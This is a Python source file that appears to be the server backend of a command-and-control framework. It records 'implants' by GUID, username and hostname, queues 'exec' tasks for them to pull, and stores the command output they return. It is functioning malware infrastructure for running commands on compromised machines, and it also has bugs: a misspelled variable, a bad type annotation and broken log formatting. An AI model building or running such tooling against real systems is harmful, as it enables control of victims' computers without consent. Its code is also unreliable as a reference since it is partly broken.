from speedrun.db import db 
from dataclasses import dataclass 
from speedrun.implant_pb2 import * 

@dataclass
class Implant(db.Model):
    id :id =  db.Column(db.Integer, primary_key = True)
    implant_guid :str = db.Column(db.String)
    username :str = db.Column(db.String)
    hostname:str  = db.Column(db.String)

def make_implant_from_request(r : Register):
    # TODO make sure it s all valid 
    print(r)
    i = Implant()
    i.implant_guid = r.GUID 
    i.username = r.Username 
    i.hostname = r.Hostname
    print(i)
    db.session.add(i)
    db.session.commit()
    return i

opcodes = {
        "exec": 1
        }



STATUS_CREATED  = "created"
STATUS_TASKED = "tasked" # the implant pulled down the task 
STATUS_OK = "ok" # the implant succesfull completed the task 
STATUS_FAIL = "fail" # implant did not complete the task 

import os 
def make_task_id():
    return os.urandom(16).hex()

# TODO NOT NULL most of these 
@dataclass 
class Task(db.Model):
    id: int  =  db.Column(db.Integer, primary_key = True)
    task_id: str = db.Column(db.String)
    status: str = db.Column(db.String)
    implant_id:int   = db.Column(db.Integer)
    task_opcode:str  = db.Column(db.String)
    task_args:str  = db.Column(db.String)
    task_response:bytes = db.Column(db.LargeBinary)



def make_task( implant_id, task_opcode, task_args):
    t = Task(
            task_id=make_task_id(), 
            status = STATUS_CREATED, 
            implant_id = implant_id, 
            task_args  = task_args,
            task_opcode= task_opcode,
            )
    db.session.add(t)
    db.session.commit()
    return t 



def get_task_for_implant(implant_guid):
    """
    Get a task for an implant 
    """
    i =  db.session.query(Implant).filter_by(implant_guid= implant_guid).first()
    if not i:
        print(f"No implant with id {i}")
        return False 
    task = db.session.query(Task).filter_by(implant_id=i.id, status = STATUS_CREATED).first() 
    if task:
        task.status = STATUS_TASKED
        db.session.add(task)
        db.session.commit()
        print(f"Pulling down {task}")
        return task
    return False 

def handle_task_complete(task_id, tr: TaskResponse ):
    with db.session() as session:
        if not tr.TaskGuid:
            return False
        task = session.query(Task).filter_by(task_id = tr.TaskGuid).first()
        if not task:
            print(f"Task {tr} could not be updated as the ID is missing ")
            return False
        task.status = STATUS_OK
        task.task_response = tr.Response
        session.add(task)
        session.commit()
        print("Task {} has completed", tr.TaskGuid)
    return True 

def make_implant(implant_id, username, hostname):
    im = Implant(
            implant_guid=implant_id, username=username, hostname=hostnmae,
        )
    return im 

